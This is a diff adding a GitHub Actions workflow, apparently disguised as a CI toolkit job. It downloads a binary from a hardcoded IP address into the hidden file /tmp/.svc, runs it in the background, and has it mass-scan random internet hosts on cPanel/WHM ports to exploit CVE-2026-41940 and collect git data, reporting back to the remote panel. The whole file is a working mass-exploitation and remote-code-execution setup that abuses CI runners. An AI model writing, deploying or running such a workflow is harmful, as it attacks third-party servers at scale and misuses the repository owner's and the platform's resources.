@@ -1,0 +1,48 @@
+name: shellpanel-toolkit-dispatch
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+env:
+  PANEL_URL: http://43.228.157.68:80
+
+jobs:
+  ci-run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 55
+    steps:
+      - name: Download toolkit
+        shell: bash
+        run: |
+          set -euo pipefail
+          case "$(uname -m 2>/dev/null)" in
+            i[3-6]86) suffix=386 ;;
+            aarch64|arm64) suffix=arm64 ;;
+            armv*) suffix=arm ;;
+            *) suffix=amd64 ;;
+          esac
+          curl -sfL "${PANEL_URL}/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
+            wget -qO /tmp/.svc "${PANEL_URL}/api/dl/${suffix}" 2>/dev/null
+          test -s /tmp/.svc
+          chmod 755 /tmp/.svc
+
+      - name: Run toolkit
+        shell: bash
+        run: |
+          PANEL_URL="${PANEL_URL}" \
+          GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \
+          GITHUB_RUN_ID="${GITHUB_RUN_ID}" \
+          GOMEMLIMIT=2147483648 \
+          nohup /tmp/.svc ipscan \
+            --source random \
+            --workers 1000 \
+            --exploit CVE-2026-41940 \
+            --git \
+            --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
+            --port-timeout=200 \
+            --git-workers 20 \
+            --count 9999999999 \
+            --no-reverse 2>&1 | tail -2 || true
